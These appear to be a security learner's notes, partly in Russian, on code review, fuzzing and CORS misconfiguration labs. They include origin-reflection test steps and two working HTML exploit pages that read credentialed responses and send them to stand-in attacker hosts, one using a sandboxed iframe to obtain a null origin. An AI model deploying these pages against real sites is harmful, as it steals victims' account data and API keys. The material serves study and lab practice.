# Analyzing Source Code for Vulnerabilities
Load source code
Use IDE debugger to analyze
Find authorization, authentication, redirects, secrets, user input logic, pages without authentication


# DAST
Fuzzing


# CORS
Политика обходящая SOP. Цель дать доступ другим сайтам свои ресурсы к сайту хакера
#### CORS vulnerability with basic origin reflection
Получить любой ответ от сервера
Проверить наличие заголовков Access-Control-Allow-...
Вставить через прокси заголовок `Origin: https://hello.world` ИЛИ `null`
Уязвим - если в ответе появился `Access-Control-Allow-Origin: https://hello.world`
<img src="../Media/cors-vulnerability-with-basic-origin-reflection.png" alt="drawing" width="150"/>
```html
<html><body><script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
            location='//malicious-website.com/log?key='+this.responseText;
        };
</script></body></html>
```

```html
<html>
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','X.web-security-academy.net/accountDetails',true);
            req.withCredentials = true;
            req.send();
            function reqListener() {
                location='X.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
            };
        </script>"></iframe>
</html>
```

#### Exploiting XSS via CORS trust relationship
|---|---|
|GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...|HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true|